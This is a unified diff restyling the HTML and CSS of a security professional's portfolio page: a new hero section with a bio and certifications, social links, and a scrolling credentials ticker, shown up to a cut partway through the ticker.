@@ -2,292 +2,227 @@
 <html lang="en">
 <head>
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="viewport" content="width=device-width,initial-scale=1">
 <title>cyb3radull4m</title>
 <meta name="claude:viewport-fit-sides" content="cover">
 <style>
-  /* Layout: committed dark terminal-hacker identity. Wide left-anchored shell; two-column hero; matrix + scanlines bg; burst-glitch headline; scroll-reveal sections. */
   :root{
-    --bg:#0a0c11; --surface:#12151d; --surface-2:#191d27; --fg:#e9e7e0; --muted:#8b93a6;
-    --border:#242a38; --accent:#f0a93b; --accent-2:#43d3a8; --danger:#e06a5a;
-    --matrix:#2fd79a; --scan:rgba(255,255,255,.028); --mop:.15; --glow:rgba(240,169,59,.07);
-    --maxw:1060px;
+    --bg:#0c0c0c;--surface:#161616;--surface-2:#1e1e1e;--fg:#e8e6e1;--muted:#7a7a7a;
+    --border:#262626;--accent:#d4a04a;--accent-2:#5cc8a4;--danger:#cf5c4e;
+    --maxw:1100px;
     --f-mono:"JetBrains Mono",ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
     --f-sans:"IBM Plex Sans",system-ui,-apple-system,Segoe UI,Roboto,sans-serif;
     color-scheme:dark;
   }
-
-  *{box-sizing:border-box}
+  *{box-sizing:border-box;margin:0}
   html{scroll-behavior:smooth}
-  body{background-color:var(--bg);
-    background-image:radial-gradient(1100px circle at 18% -5%,var(--glow),transparent 55%);
-    color:var(--fg);font-family:var(--f-sans);line-height:1.6;font-size:16px;-webkit-font-smoothing:antialiased}
-  body::before{content:"";position:fixed;inset:0 0 auto;height:env(safe-area-inset-top,0px);background:var(--bg);z-index:60}
-
-  /* background fx */
-  #matrix{position:fixed;inset:0;width:100%;height:100%;z-index:-1;opacity:var(--mop);pointer-events:none}
-  .cursor-glow{position:fixed;width:280px;height:280px;border-radius:50%;pointer-events:none;z-index:49;
-    background:radial-gradient(circle,rgba(240,169,59,.08) 0%,rgba(67,211,168,.04) 40%,transparent 70%);
-    transform:translate(-50%,-50%);transition:opacity .3s ease;opacity:0}
-  .has-js .cursor-glow{opacity:1}
-  .scan{position:fixed;inset:0;pointer-events:none;z-index:50;opacity:.6;
-    background:repeating-linear-gradient(to bottom,var(--scan) 0 1px,transparent 1px 3px)}
-
-  .wrap{max-width:var(--maxw);margin:0 auto;position:relative;
-    padding-left:max(24px,env(safe-area-inset-left,0px));
-    padding-right:max(24px,env(safe-area-inset-right,0px))}
+  body{background:var(--bg);color:var(--fg);font-family:var(--f-sans);font-size:16px;line-height:1.65;-webkit-font-smoothing:antialiased}
+  ::selection{background:var(--accent);color:#0c0c0c}
+  :focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:3px}
   a{color:var(--accent-2);text-decoration:none}
   a:hover{text-decoration:underline}
-  ::selection{background:var(--accent);color:#0a0c11}
-  :focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:3px}
+  img{display:block;max-width:100%}
 
-  /* ---- top bar ---- */
-  header.bar{position:sticky;top:env(safe-area-inset-top,0px);z-index:40;
-    background:color-mix(in srgb,var(--bg) 82%,transparent);backdrop-filter:blur(9px);
-    border-bottom:1px solid var(--border)}
-  .bar .wrap{display:flex;align-items:center;gap:12px;padding-block:13px}
-  .brand{font-family:var(--f-mono);font-weight:700;letter-spacing:-.01em;color:var(--fg)}
-  .brand .dot{color:var(--accent)}
-  .bar nav{margin-left:auto;display:flex;gap:20px;font-family:var(--f-mono);font-size:13px}
-  .bar nav a{color:var(--muted);position:relative;transition:color .15s ease}
-  .bar nav a::before{content:"";position:absolute;left:0;right:100%;bottom:-5px;height:2px;
-    background:var(--accent);transition:right .2s ease}
-  .bar nav a:hover{color:var(--fg);text-decoration:none}
-  .bar nav a.active{color:var(--accent)}
-  .bar nav a.active::before{right:0}
-  @media (max-width:600px){ .bar nav{gap:14px;font-size:12px} }
-  @media (max-width:430px){ .bar nav a:nth-child(n+4){display:none} }
+  .wrap{max-width:var(--maxw);margin:0 auto;
+    padding-left:max(24px,env(safe-area-inset-left,0px));
+    padding-right:max(24px,env(safe-area-inset-right,0px))}
+
+  /* ---- nav ---- */
+  header{position:sticky;top:0;z-index:40;background:rgba(12,12,12,.88);backdrop-filter:blur(12px);border-bottom:1px solid var(--border)}
+  header .wrap{display:flex;align-items:center;padding-block:14px}
+  .logo{font-family:var(--f-mono);font-weight:700;font-size:15px;color:var(--fg);letter-spacing:-.02em}
+  .logo span{color:var(--accent)}
+  nav{margin-left:auto;display:flex;align-items:center;gap:22px}
+  nav a{font-family:var(--f-mono);font-size:12.5px;color:var(--muted);letter-spacing:.02em;transition:color .15s}
+  nav a:hover{color:var(--fg);text-decoration:none}
+  .socials{display:flex;align-items:center;gap:14px;margin-left:18px;padding-left:18px;border-left:1px solid var(--border)}
+  .socials a{color:var(--muted);transition:color .15s}
+  .socials a:hover{color:var(--fg);text-decoration:none}
+  .socials svg{width:16px;height:16px;fill:currentColor;display:block}
+  @media(max-width:700px){nav a:nth-child(n+5){display:none}.socials{margin-left:12px;padding-left:12px;gap:10px}}
+  @media(max-width:500px){nav a:nth-child(n+3){display:none}}
 
   /* ---- hero ---- */
-  .hero{padding-block:52px 44px;border-bottom:1px solid var(--border)}
-  .hero .wrap{display:grid;grid-template-columns:1.02fr .98fr;gap:44px;align-items:center}
-  @media (max-width:860px){ .hero .wrap{grid-template-columns:1fr;gap:30px} }
-  .kicker{font-family:var(--f-mono);font-size:12px;letter-spacing:.16em;text-transform:uppercase;
-    color:var(--accent-2);margin:0 0 16px}
-  .kicker .b{color:var(--accent)}
-  h1.glitch{font-family:var(--f-mono);font-weight:700;font-size:clamp(2.4rem,8vw,4.2rem);
-    letter-spacing:-.04em;line-height:1;margin:0 0 18px;position:relative;color:var(--fg);
-    width:max-content;max-width:100%}
-  .glitch::before,.glitch::after{content:attr(data-text);position:absolute;inset:0;overflow:hidden;opacity:0}
-  .glitch::before{color:var(--accent-2)}
-  .glitch::after{color:var(--accent)}
-  .htag{font-size:clamp(1.05rem,2.4vw,1.28rem);color:var(--fg);max-width:40ch;margin:0 0 12px;text-wrap:balance}
-  .hsub{color:var(--muted);max-width:46ch;margin:0}
+  .hero{padding:80px 0 64px;border-bottom:1px solid var(--border)}
+  .hero-inner{max-width:720px}
+  .hero-label{font-family:var(--f-mono);font-size:13px;color:var(--accent);margin-bottom:18px;letter-spacing:.03em}
+  .hero h1{font-family:var(--f-mono);font-weight:700;font-size:clamp(2.6rem,7vw,4rem);line-height:1.05;letter-spacing:-.04em;margin-bottom:20px}
+  .hero-sub{font-size:1.15rem;color:var(--muted);max-width:58ch;line-height:1.6;margin-bottom:32px}
+  .hero-tags{display:flex;flex-wrap:wrap;gap:8px}
+  .htag{font-family:var(--f-mono);font-size:11.5px;color:var(--fg);background:var(--surface-2);border:1px solid var(--border);border-radius:999px;padding:6px 14px;display:inline-flex;align-items:center;gap:6px}
+  .htag .dot{width:5px;height:5px;border-radius:50%;background:var(--accent);display:inline-block}
+  .htag.t2 .dot{background:var(--accent-2)}
+  @media(max-width:600px){.hero{padding:52px 0 40px}.hero h1{font-size:clamp(2rem,8vw,3rem)}}
 
-  /* terminal */
-  .term{background:#070a0e;border:1px solid var(--border);border-radius:11px;overflow:hidden;
-    box-shadow:0 24px 60px rgba(0,0,0,.45);width:100%}
-  .termbar{display:flex;align-items:center;gap:8px;padding:10px 13px;background:#0e1118;border-bottom:1px solid #1d2230}
-  .tdot{width:11px;height:11px;border-radius:50%;flex:none}
-  .td1{background:#ff5f56}.td2{background:#ffbd2e}.td3{background:#27c93f}
-  .termttl{font-family:var(--f-mono);font-size:11.5px;color:#5a6474;margin-left:8px}
-  .termbody{padding:16px 16px 18px;font-family:var(--f-mono);font-size:13.5px;line-height:1.75;
-    color:#cfd4de;min-height:232px}
-  .tline{margin:0;white-space:pre-wrap;overflow-wrap:anywhere}
-  .tline.cmd::before{content:"cyb3r@sec:~$ ";color:var(--accent-2)}
-  .tline.out{color:#8b93a6}
-  .tline.out.hl{color:#f0a93b}
-  .tline.active::after{content:"\258B";color:#f0a93b;margin-left:1px;animation:blink 1s step-end infinite}
-
-  .chips{display:flex;flex-wrap:wrap;gap:10px;margin:28px 0 0;grid-column:1/-1}
-  .chip{display:inline-flex;align-items:center;gap:7px;font-family:var(--f-mono);font-size:12.5px;
-    background:var(--surface);border:1px solid var(--border);border-radius:999px;padding:7px 13px;color:var(--fg)}
-  .chip b{color:var(--accent);font-weight:700}
-  .chip.t2 b{color:var(--accent-2)}
+  /* ---- ticker ---- */
+  .ticker{border-bottom:1px solid var(--border);overflow:hidden;white-space:nowrap;padding:12px 0}
+  .ticker-track{display:inline-flex;gap:36px;animation:scroll-left 30s linear infinite}
+  .ticker-track span{font-family:var(--f-mono);font-size:12px;color:var(--muted);letter-spacing:.06em;text-transform:uppercase;flex:none}
+  .ticker-track span b{color:var(--accent);font-weight:600}
+  @keyframes scroll-left{0%{transform:translateX(0)}100%{transform:translateX(-50%)}}
+  @media(prefers-reduced-motion:reduce){.ticker-track{animation:none}}
 
   /* ---- sections ---- */
-  section{padding-block:48px;border-bottom:1px solid var(--border)}
-  .eyebrow{font-family:var(--f-mono);font-size:12.5px;color:var(--accent-2);margin:0 0 8px}
-  .eyebrow .p{color:var(--muted)}
-  h2{font-family:var(--f-mono);font-weight:700;font-size:1.55rem;letter-spacing:-.02em;margin:0 0 6px}
-  .lead{color:var(--muted);max-width:64ch;margin:0 0 28px}
+  section{padding:64px 0;border-bottom:1px solid var(--border)}
+  .s-label{font-family:var(--f-mono);font-size:11.5px;color:var(--accent);letter-spacing:.08em;text-transform:uppercase;margin-bottom:10px}
+  h2{font-family:var(--f-mono);font-weight:700;font-size:clamp(1.4rem,3vw,1.8rem);letter-spacing:-.02em;margin-bottom:8px}
+  .s-desc{color:var(--muted);max-width:60ch;margin-bottom:36px;font-size:.97rem}
 
-  /* reveal on scroll */
-  .has-js .reveal{opacity:0;transform:translateY(18px);transition:opacity .55s ease,transform .55s ease}
-  .has-js .reveal.in{opacity:1;transform:none}
-
-  /* writeups */
-  .posts{display:flex;flex-wrap:wrap;gap:16px}
-  .post{display:block;background:var(--surface);border:1px solid var(--border);border-radius:10px;
-    padding:20px;border-left:3px solid var(--accent);transition:transform .15s ease,border-color .15s ease;
-    width:calc(50% - 8px);min-width:0;box-sizing:border-box}
-  @media (max-width:640px){ .post{width:100%} }
-  .post:hover{transform:translateY(-3px);border-left-color:var(--accent-2)}
-  .post .meta{font-family:var(--f-mono);font-size:11.5px;color:var(--muted);
-    display:flex;gap:10px;flex-wrap:wrap;margin-bottom:10px;align-items:center}
-  .tag{color:var(--accent-2);border:1px solid var(--border);border-radius:4px;padding:1px 7px}
-  .soon{color:var(--accent);border-color:color-mix(in srgb,var(--accent) 40%,var(--border))}
-  .post h3{font-family:var(--f-sans);font-size:1.12rem;font-weight:600;margin:0 0 6px;color:var(--fg);letter-spacing:-.01em}
-  .post p{margin:0;color:var(--muted);font-size:.95rem}
-
-  /* pillars */
-  .pillars{display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
-  @media (max-width:760px){ .pillars{grid-template-columns:1fr 1fr} }
-  @media (max-width:480px){ .pillars{grid-template-columns:1fr} }
-  .pillar{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:18px;min-width:0;
-    transition:border-color .15s ease,transform .15s ease}
-  .pillar:hover{border-color:var(--accent-2);transform:translateY(-2px)}
-  .pillar .n{font-family:var(--f-mono);font-size:12px;color:var(--accent);margin-bottom:8px}
-  .pillar h3{font-size:1rem;margin:0 0 6px;letter-spacing:-.01em}
-  .pillar p{margin:0;color:var(--muted);font-size:.9rem}
-
-  /* work */
-  .work{display:flex;flex-direction:column;gap:0}
-  .op{display:grid;grid-template-columns:150px 1fr;gap:18px;padding:16px 0;border-top:1px solid var(--border)}
-  .op:first-child{border-top:0}
-  .op .sector{font-family:var(--f-mono);font-size:12px;color:var(--accent-2);padding-top:2px}
-  .op .d{min-width:0}
-  .op h3{font-size:1rem;margin:0 0 4px;letter-spacing:-.01em}
-  .op p{margin:0;color:var(--muted);font-size:.93rem}
-  @media (max-width:600px){ .op{grid-template-columns:1fr;gap:5px} }
-
-  /* creds */
-  .credgrid{display:grid;grid-template-columns:1fr 1fr;gap:30px}
-  @media (max-width:600px){ .credgrid{grid-template-columns:1fr;gap:22px} }
-  .credgrid h3{font-family:var(--f-mono);font-size:12.5px;letter-spacing:.1em;text-transform:uppercase;
-    color:var(--muted);margin:0 0 12px;font-weight:600}
-  .taglist{display:flex;flex-wrap:wrap;gap:8px;list-style:none;padding:0;margin:0}
-  .taglist li{font-family:var(--f-mono);font-size:12.5px;background:var(--surface);border:1px solid var(--border);
-    border-radius:6px;padding:6px 10px}
-  .taglist li.key{border-color:color-mix(in srgb,var(--accent) 45%,var(--border));color:var(--fg)}
-  .taglist li.key::before{content:"\2605 ";color:var(--accent)}
-
-  /* contact */
-  .contact-row{display:flex;flex-wrap:wrap;gap:12px;margin-top:6px}
-  .cline{display:flex;align-items:center;gap:10px;background:var(--surface);border:1px solid var(--border);
-    border-radius:8px;padding:10px 14px;font-family:var(--f-mono);font-size:13px;min-width:0}
-  .cline .k{color:var(--accent-2)}
-  .cline .v{color:var(--fg);word-break:break-all}
-  .cline a.v{color:var(--accent-2)}
-  .copy{background:transparent;border:1px solid var(--border);color:var(--muted);border-radius:5px;
-    font-family:var(--f-mono);font-size:11px;padding:3px 7px;cursor:pointer;flex:none}
-  .copy:hover{color:var(--accent);border-color:var(--accent)}
-  .copy.ok{color:var(--accent-2);border-color:var(--accent-2)}
-  .note{font-family:var(--f-mono);font-size:12px;color:var(--muted);margin-top:16px;
-    border-left:2px solid var(--border);padding-left:12px}
-
-  footer{padding-block:28px 40px;color:var(--muted);font-family:var(--f-mono);font-size:12px}
-  footer .wrap{display:flex;justify-content:space-between;flex-wrap:wrap;gap:8px}
-
-  @keyframes blink{50%{opacity:0}}
-  /* glitch fires in short bursts over crisp text, then rests clean */
-  @keyframes gl1{0%,90%,100%{opacity:0;transform:translate(0,0)}
-    91%{opacity:.85;transform:translate(-3px,1px);clip-path:inset(10% 0 58% 0)}
-    94%{opacity:.85;transform:translate(2px,-1px);clip-path:inset(60% 0 16% 0)}
-    97%{opacity:0}}
-  @keyframes gl2{0%,40%,56%,100%{opacity:0;transform:translate(0,0)}
-    44%{opacity:.8;transform:translate(3px,-1px);clip-path:inset(30% 0 40% 0)}
-    50%{opacity:.8;transform:translate(-2px,1px);clip-path:inset(72% 0 6% 0)}
-    54%{opacity:0}}
-  @media (prefers-reduced-motion:no-preference){
-    .glitch::before{animation:gl1 6s infinite steps(1,end)}
-    .glitch::after{animation:gl2 6s infinite steps(1,end)}
-    .glitch{animation:jit 6s infinite steps(1,end)}
-  }
-  @keyframes jit{0%,100%{transform:translate(0,0)}45%{transform:translate(1px,0)}50%{transform:translate(-1px,0)}92%{transform:translate(-1px,0)}95%{transform:translate(1px,0)}}
-  @media (prefers-reduced-motion:reduce){
-    html{scroll-behavior:auto}
-    .glitch::before,.glitch::after{display:none}
-    .scan{display:none}
-  }
-  /* writeup accordion + article typography */
-  details.post{transition:border-color .15s ease}
-  details.post:hover{transform:none}
-  details.post>summary{cursor:pointer;list-style:none;outline:none}
-  details.post>summary::-webkit-details-marker{display:none}
-  details.post>summary::marker{display:none;content:""}
-  details.post>summary h3{margin-top:6px}
-  details.post[open]{border-left-color:var(--accent-2);width:100%;flex-basis:100%}
-  .exp{color:var(--accent);margin-left:auto}
-  details.post[open] .exp{opacity:.5}
-  /* polyfill: browsers that don't support <details> show content always */
-  details.post>.art{display:none}
-  details.post[open]>.art{display:block}
-  .art{margin-top:14px;border-top:1px solid var(--border);padding-top:14px}
-  .art h4{font-family:var(--f-mono);font-size:.92rem;color:var(--accent);margin:18px 0 8px;letter-spacing:-.01em}
+  /* ---- writeups ---- */
+  .articles{display:flex;flex-direction:column;gap:1px;background:var(--border);border:1px solid var(--border);border-radius:10px;overflow:hidden}
+  details.article{background:var(--surface);transition:background .15s}
+  details.article:hover{background:var(--surface-2)}
+  details.article>summary{cursor:pointer;list-style:none;padding:20px 24px;display:flex;align-items:baseline;gap:16px}
+  details.article>summary::-webkit-details-marker{display:none}
+  details.article>summary::marker{display:none;content:""}
+  details.article>summary .a-tag{font-family:var(--f-mono);font-size:11px;color:var(--accent-2);background:rgba(92,200,164,.1);border-radius:4px;padding:3px 8px;flex:none;text-transform:uppercase;letter-spacing:.04em}
+  details.article>summary h3{font-size:1rem;font-weight:500;flex:1;min-width:0}
+  details.article>summary .toggle{font-family:var(--f-mono);font-size:11px;color:var(--muted);flex:none;transition:color .15s}
+  details.article[open]>summary .toggle{color:var(--accent)}
+  details.article[open]{background:var(--surface)}
+  .art{padding:0 24px 24px;border-top:1px solid var(--border);margin:0 24px;padding-top:20px}
+  details.article>.art{display:none}
+  details.article[open]>.art{display:block}
+  .art h4{font-family:var(--f-mono);font-size:.88rem;color:var(--accent);margin:20px 0 8px;letter-spacing:-.01em}
   .art h4:first-child{margin-top:0}
-  .art p{color:var(--muted);margin:0 0 12px;font-size:.95rem}
-  .art ol,.art ul{color:var(--muted);margin:0 0 14px;padding-left:20px;font-size:.93rem}
+  .art p{color:var(--muted);margin:0 0 12px;font-size:.94rem}
+  .art ol,.art ul{color:var(--muted);margin:0 0 14px;padding-left:20px;font-size:.92rem}
   .art li{margin:6px 0}
   .art strong{color:var(--fg)}
-  .art code{font-family:var(--f-mono);background:#0b0e14;border:1px solid var(--border);border-radius:4px;padding:1px 5px;font-size:.85em;color:var(--accent-2)}
-  .art pre{background:#070a0e;border:1px solid var(--border);border-radius:8px;padding:12px 14px;overflow-x:auto;margin:0 0 14px}
-  .art pre code{background:none;border:0;padding:0;color:#cfd4de;font-size:.82rem;line-height:1.65;white-space:pre}
-  .art pre{position:relative}
-  .art .toc{font-family:var(--f-mono);font-size:.82rem;color:var(--muted);background:#0b0e14;border:1px solid var(--border);border-radius:8px;padding:12px 14px;margin:0 0 16px}
+  .art code{font-family:var(--f-mono);background:var(--bg);border:1px solid var(--border);border-radius:4px;padding:1px 5px;font-size:.83em;color:var(--accent-2)}
+  .art pre{background:var(--bg);border:1px solid var(--border);border-radius:8px;padding:14px 16px;overflow-x:auto;margin:0 0 14px;position:relative}
+  .art pre code{background:none;border:0;padding:0;color:#c5c5c5;font-size:.8rem;line-height:1.7;white-space:pre}
+  .art .toc{font-family:var(--f-mono);font-size:.8rem;color:var(--muted);background:var(--bg);border:1px solid var(--border);border-radius:8px;padding:12px 14px;margin:0 0 16px}
   .art .toc b{color:var(--accent-2)}
-  .art .cp{position:absolute;top:7px;right:7px;background:#11151c;border:1px solid var(--border);color:var(--muted);border-radius:5px;font-family:var(--f-mono);font-size:10px;padding:2px 7px;cursor:pointer;opacity:.7}
+  .art .cp{position:absolute;top:7px;right:7px;background:var(--surface);border:1px solid var(--border);color:var(--muted);border-radius:5px;font-family:var(--f-mono);font-size:10px;padding:2px 7px;cursor:pointer;opacity:.6;transition:opacity .15s,color .15s,border-color .15s}
   .art .cp:hover{color:var(--accent);border-color:var(--accent);opacity:1}
   .art .cp.ok{color:var(--accent-2);border-color:var(--accent-2)}
+  @media(max-width:600px){details.article>summary{flex-wrap:wrap;padding:16px 18px;gap:8px}.art{margin:0 18px;padding:16px 18px 18px 0}}
+
+  /* ---- labs ---- */
+  .labs-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:12px}
+  @media(max-width:800px){.labs-grid{grid-template-columns:1fr 1fr}}
+  @media(max-width:500px){.labs-grid{grid-template-columns:1fr}}
+  .lab{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:22px;transition:border-color .2s,transform .15s}
+  .lab:hover{border-color:var(--accent);transform:translateY(-2px)}
+  .lab-num{font-family:var(--f-mono);font-size:11px;color:var(--muted);margin-bottom:10px}
+  .lab-lang{color:var(--accent-2)}
+  .lab h3{font-size:1rem;font-weight:600;margin-bottom:6px;letter-spacing:-.01em}
+  .lab p{color:var(--muted);font-size:.9rem;margin:0}
+  .lab-diff{display:inline-flex;gap:2px;margin-left:6px}
+  .lab-diff i{width:6px;height:6px;border-radius:50%;background:var(--border);display:inline-block}
+  .lab-diff i.on{background:var(--accent)}
+
+  /* ---- focus ---- */
+  .focus-grid{display:grid;grid-template-columns:1fr 1fr;gap:32px 48px}
+  @media(max-width:640px){.focus-grid{grid-template-columns:1fr;gap:24px}}
+  .focus-item h3{font-size:1rem;font-weight:600;margin-bottom:4px}
+  .focus-item p{color:var(--muted);font-size:.93rem}
+  .focus-num{font-family:var(--f-mono);font-size:11px;color:var(--accent);margin-bottom:6px}
+
+  /* ---- engagements ---- */
+  .eng-list{display:flex;flex-direction:column;gap:0}
+  .eng{display:flex;gap:20px;padding:18px 0;border-top:1px solid var(--border)}
+  .eng:first-child{border-top:0;padding-top:0}
+  .eng-sector{font-family:var(--f-mono);font-size:11px;color:var(--accent-2);text-transform:uppercase;letter-spacing:.04em;width:100px;flex:none;padding-top:3px}
+  .eng-body h3{font-size:.97rem;font-weight:500;margin-bottom:3px}
+  .eng-body p{color:var(--muted);font-size:.9rem}
+  @media(max-width:600px){.eng{flex-direction:column;gap:4px}.eng-sector{width:auto}}
+
+  /* ---- credentials ---- */
+  .cred-cols{display:grid;grid-template-columns:1fr 1fr;gap:36px}
+  @media(max-width:600px){.cred-cols{grid-template-columns:1fr;gap:28px}}
+  .cred-group h3{font-family:var(--f-mono);font-size:11px;letter-spacing:.08em;text-transform:uppercase;color:var(--muted);margin-bottom:14px}
+  .tags{display:flex;flex-wrap:wrap;gap:6px;list-style:none;padding:0}
+  .tags li{font-family:var(--f-mono);font-size:12px;background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:6px 11px;color:var(--muted)}
+  .tags li.key{color:var(--fg);border-color:color-mix(in srgb,var(--accent) 40%,var(--border))}
+
+  /* ---- contact ---- */
+  .contact-links{display:flex;flex-wrap:wrap;gap:10px}
+  .c-link{display:flex;align-items:center;gap:10px;font-family:var(--f-mono);font-size:13px;background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:10px 16px;transition:border-color .15s}
+  .c-link:hover{border-color:var(--accent-2);text-decoration:none}
+  .c-link .label{color:var(--muted);font-size:11px;text-transform:uppercase;letter-spacing:.04em}
+  .c-link .val{color:var(--fg)}
+  .c-copy{background:transparent;border:1px solid var(--border);color:var(--muted);border-radius:4px;font-family:var(--f-mono);font-size:10px;padding:2px 6px;cursor:pointer;margin-left:auto;transition:color .15s,border-color .15s}
+  .c-copy:hover{color:var(--accent);border-color:var(--accent)}
+  .c-copy.ok{color:var(--accent-2);border-color:var(--accent-2)}
+
+  /* ---- footer ---- */
+  footer{padding:40px 0 48px;color:var(--muted);font-family:var(--f-mono);font-size:12px}
+  footer .wrap{display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:12px}
+  footer a{color:var(--muted)}
+  footer a:hover{color:var(--fg)}
+  .foot-links{display:flex;gap:18px}
+
+  @media(prefers-reduced-motion:reduce){html{scroll-behavior:auto}}
 </style>
 
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
 
-<canvas id="matrix" aria-hidden="true"></canvas>
-<div class="cursor-glow" id="cursor-glow" aria-hidden="true"></div>
-<div class="scan" aria-hidden="true"></div>
-
-<header class="bar">
+<header>
   <div class="wrap">
-    <span class="brand">cyb3radull4m<span class="dot">_</span></span>
+    <a href="#" class="logo">cyb3radull4m<span>.</span></a>
     <nav>
-      <a href="#writeups">writeups</a>
-      <a href="#labs">labs</a>
-      <a href="#focus">focus</a>
-      <a href="#work">work</a>
-      <a href="#creds">creds</a>
-      <a href="#contact">contact</a>
+      <a href="#writeups">Writeups</a>
+      <a href="#labs">Labs</a>
+      <a href="#work">Work</a>
+      <a href="#creds">Credentials</a>
+      <a href="#contact">Contact</a>
+      <div class="socials">
+        <a href="https://github.com/cyb3radull4m" target="_blank" rel="noopener" aria-label="GitHub"><svg viewBox="0 0 24 24"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0024 12c0-6.63-5.37-12-12-12z"/></svg></a>
+        <a href="https://x.com/cyb3radull4m" target="_blank" rel="noopener" aria-label="X"><svg viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg></a>
+        <a href="https://www.linkedin.com/in/ewaoluwa-adeniji" target="_blank" rel="noopener" aria-label="LinkedIn"><svg viewBox="0 0 24 24"><path d="M20.5 2h-17A1.5 1.5 0 002 3.5v17A1.5 1.5 0 003.5 22h17a1.5 1.5 0 001.5-1.5v-17A1.5 1.5 0 0020.5 2zM8 19H5v-9h3zM6.5 8.25A1.75 1.75 0 118.3 6.5a1.78 1.78 0 01-1.8 1.75zM19 19h-3v-4.74c0-1.42-.6-1.93-1.38-1.93A1.74 1.74 0 0013 14.19a.66.66 0 000 .14V19h-3v-9h2.9v1.3a3.11 3.11 0 012.7-1.4c1.55 0 3.36.86 3.36 3.66z"/></svg></a>
+      </div>
     </nav>
   </div>
 </header>
 
 <main>
-  <section class="hero" id="top">
+  <section class="hero">
     <div class="wrap">
-      <div class="hcol">
-        <p class="kicker">// <span class="b">Welcome, intruder.</span> access granted</p>
-        <h1 class="glitch" data-text="cyb3radull4m">cyb3radull4m</h1>
-        <p class="htag">Senior offensive security professional.</p>
-        <p class="hsub">Five years delivering advanced red team engagements and adversary emulation against critical national infrastructure across Africa &mdash; energy, financial services, government, and telecommunications. Deep technical expertise spanning covert initial access, custom malware development in C and C#, C2 infrastructure, EDR evasion, and lateral movement within large-scale Active Directory environments.</p>
-      </div>
-      <div class="term" role="img" aria-label="Terminal introducing cyb3radull4m, offensive security researcher and red teamer">
-        <div class="termbar">
-          <span class="tdot td1"></span><span class="tdot td2"></span><span class="tdot td3"></span>
-          <span class="termttl">bash — cyb3radull4m@sec</span>
+      <div class="hero-inner">
+        <p class="hero-label">Offensive Security</p>
+        <h1>Ewaoluwa Adeniji</h1>
+        <p class="hero-sub">Senior offensive security professional. Five years delivering red team engagements and adversary emulation against critical national infrastructure across Africa &mdash; energy, financial services, government, and telecommunications. Custom malware development, C2 infrastructure, and deep application security research.</p>
+        <div class="hero-tags">
+          <span class="htag"><span class="dot"></span>EC-Council Hall of Fame</span>
+          <span class="htag t2"><span class="dot"></span>Synack Red Team</span>
+          <span class="htag t2"><span class="dot"></span>YesWeHack Researcher</span>
+          <span class="htag"><span class="dot"></span>OSWE &middot; OSEP &middot; OSCP</span>
+          <span class="htag"><span class="dot"></span>Outstanding Young CyberSec Professional &middot; Finalist</span>
         </div>
-        <div class="termbody" id="term">
-          <p class="tline cmd">whoami</p>
-          <p class="tline out hl">cyb3radull4m</p>
-          <p class="tline cmd">cat ./role.txt</p>
-          <p class="tline out">Senior offensive security professional.</p>
-          <p class="tline cmd">cat ./focus.txt</p>
-          <p class="tline out">red-team &middot; adversary-emulation &middot; malware-dev &middot; appsec &middot; bug-bounty</p>
-          <p class="tline cmd">./list-proof --short</p>
-        </div>
-      </div>
-      <div class="chips">
-        <span class="chip t2"><b>EC-Council</b> Hall of Fame</span>
-        <span class="chip t2"><b>Synack</b> Red Team</span>
-        <span class="chip"><b>YesWeHack</b> Researcher</span>
-        <span class="chip">OSWE &middot; OSEP &middot; <b>OSCP</b></span>
-        <span class="chip t2">Outstanding Young CyberSec Professional &middot; <b>Finalist</b></span>
       </div>
     </div>
   </section>
 
-  <section id="writeups" class="reveal">
-    <div class="wrap">
-      <p class="eyebrow"><span class="p">cyb3r@sec:~$</span> cat writeups/*</p>
-      <h2>Writeups</h2>
-      <p class="lead">Technique-level breakdowns of the bugs I hunt &mdash; sanitised, client-free, and focused on the pattern you can reuse. The flagship lane is business logic in money-movement and identity flows.</p>
-      <div class="posts">
+  <div class="ticker" aria-hidden="true">
+    <div class="ticker-track" id="ticker">
+      <span><b>OSWE</b></span><span><b>OSEP</b></span><span><b>OSCP</b></span>
+      <span>LPT</span><span>CHFI</span><span>CEH</span><span>Maldev Academy</span>
+      <span><b>APTLabs</b></span><span><b>Cybernetics</b></span><span>Dante</span><span>Zephyr</span>
+      <span>Offshore</span><span>RastaLabs</span><span>Hades</span>
+      <span>CNSP</span><span>CAP</span><span>API Security Architect</span><span>ISC2 CC</span><span>CCNA</span>
+      <span><b>OSWE</b></span><span><b>OSEP</b></span><span><b>OSCP</b></span>
+      <span>LPT</span><span>CHFI</span><span>CEH</span><span>Maldev Academy</span>
+      <span><b>APTLabs</b></span><span><b>Cybernetics</b></span><span>Dante</span><span>Zephyr</span>
